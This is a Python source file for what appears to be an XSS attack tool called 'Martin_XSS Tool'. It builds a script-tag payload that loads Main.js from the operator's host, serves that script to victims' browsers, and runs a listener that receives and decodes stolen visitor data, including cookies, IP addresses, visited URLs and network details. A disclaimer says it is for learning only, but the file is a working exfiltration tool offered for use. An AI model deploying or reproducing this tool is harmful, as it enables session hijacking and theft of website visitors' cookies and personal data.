#!/usr/bin/python3
# @Martin
import base64
import json
import socket
import sys
import argparse
import datetime
import textwrap
import threading
import re
Version = "V3.0"
Title='''Github==>https://github.com/MartinxMax\n<免责声明>:仅供学习实验使用,请勿用于非法行为,否则自行承担法律责任\n<Disclaimer>: For learning and experiment only, please do not use it for illegal acts, otherwise you will bear legal responsibility'''
def Get_LoackHost():
    return socket.gethostbyname(socket.gethostname())
class TCPINFO():
    def __init__(self, args):
        self.args = args
        self.LPORT = args.LPORT
        self.LHOST = args.LHOST
        self.RPORTS = args.RPORTS
        self.RHOSTS = args.RHOSTS
        self.Transmission_mode=args.Transmission_mode
    def run(self): 
        PAYLOAD = f"<script src=\"{self.Transmission_mode and self.RHOSTS or 'http://'+Get_LoackHost()}:{self.Transmission_mode and self.RPORTS or str(self.LPORT)}/Main.js\"></script>"
        self.Interface_JS(self.Transmission_mode and self.RHOSTS or "http://"+Get_LoackHost(),self.Transmission_mode and self.RPORTS or str(self.LPORT))
        print('-'*100,"\n[+]Payload=>",PAYLOAD,"\n",'-'*100)
        self.TCP_Listen()

    def TCP_Listen(self):
        TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP.bind(("", self.LPORT))
        TCP.listen(50)
        while True:
            SOCK,_= TCP.accept()
            threading.Thread(
                target=self.Client, args=(SOCK,)
            ).start()
    def Interface_JS(self,IP,PORT):
        with open('./Main.js','r')as f:
            Note = re.sub(',"(.*?)",true\);//Tag', f',"{IP}:{PORT}",true);//Tag', f.read())
        with open('./Main.js','w')as f:
            f.write(Note)
    def Send_JS(self,SOCK):
        with open('./Main.js','rb')as f:
            Byte_Code=f.read()
        Head = "HTTP/1.1 200 OK\r\n"
        Head += f"content-length:{len(Byte_Code)}\r\n\r\n"
        SOCK.send(Head.encode())
        SOCK.send(Byte_Code)
    def Client(self,SOCK):
        DATA = SOCK.recv(1024).decode('utf-8')

        if "Main.js" in DATA:
            self.Send_JS(SOCK)
        elif "{" in DATA:
            self.Get_User_Information_And_Display(DATA)
        SOCK.close()

    def Get_User_Information_And_Display(self,DATA):
        User_INFO = json.loads(re.search(r'{(.*?)}', DATA).group())
        for Key,Value in User_INFO.items():
            User_INFO[Key]=self.Decrypt(Value)
        Dis_Info =f'''
------------------------------------------------------------------------------
|$Time>{User_INFO['Time']}\t//Visit_URL:{User_INFO['Visit_URL']}\t#Host_Type:{User_INFO['Host_Type']}
|IP:{User_INFO['IP']}\tCookie:{User_INFO['Cookies']}\tNetWork:{User_INFO['NetWork']}   
-----------------------------------------------------------------------------       
'''
        print(Dis_Info)
    def Decrypt(self,str):
        try:
            str=base64.b64decode(str).decode("utf-8")
        except:
            pass
        return str
def main():
    print(Title)
    parser = argparse.ArgumentParser(
        description=f'Martin_XSS Tool ---Martin {Version}',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Usage:
           python3 %s # You can enable the default intranet port 5555 to listen without adding any parameters
           python3 %s -lp 1234  # You can add the - p parameter to specify the port
           python3 %s -t -lp 1234 -rh xxx.xxx.xxx.xxx -rp xxxx # You can join the IP and port penetrated by your intranet
            '''% (sys.argv[0],sys.argv[0],sys.argv[0])))  
    parser.add_argument('-lp', '--LPORT', type=int, default=8888, help='Listen port')
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='# Currently in the development stage, you don\'t need to carry this parameter')
    parser.add_argument('-t', '--Transmission_mode', action='store_true', help='Intranet penetration mode')
    parser.add_argument('-rp', '--RPORTS', type=int, default=8888, help='Remote Port')
    parser.add_argument('-rh', '--RHOSTS', default=Get_LoackHost(), help='Remote IP')
    args = parser.parse_args()
    TCPINFO(args).run()
if __name__ == '__main__':
    main()